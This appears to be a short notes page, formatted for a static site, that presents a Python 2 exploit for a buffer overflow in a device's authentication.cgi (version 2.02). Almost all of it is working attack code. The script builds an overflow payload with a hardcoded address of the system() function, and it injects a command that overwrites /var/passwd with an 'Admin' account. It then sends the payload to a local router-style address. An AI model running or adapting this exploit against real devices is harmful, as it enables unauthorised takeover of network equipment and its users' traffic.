+++
title = "Auth Buffer Overflow"
date = 2021-10-18T20:39:54-06:00
weight = 5
+++

## Auth Buffer Overflow
```python
import urllib
import urllib2

# This exploits the auth_main.cgi with read buffer overflow exploit for v2.02
# prequisite is just to have id and password fields in params

url = 'http://192.168.0.1/authentication.cgi'
junk = "A"*1004+"B"*37+"\x58\xf8\x40\x00" # address of system function in executable
junk+="X"*164+'echo  "Admin" "Admin" "0" > /var/passwd\x00'+"AAAA"
values = "id=test&password=test&test="+junk


req = urllib2.Request(url, values)
response = urllib2.urlopen(req)
the_page = response.read()
```
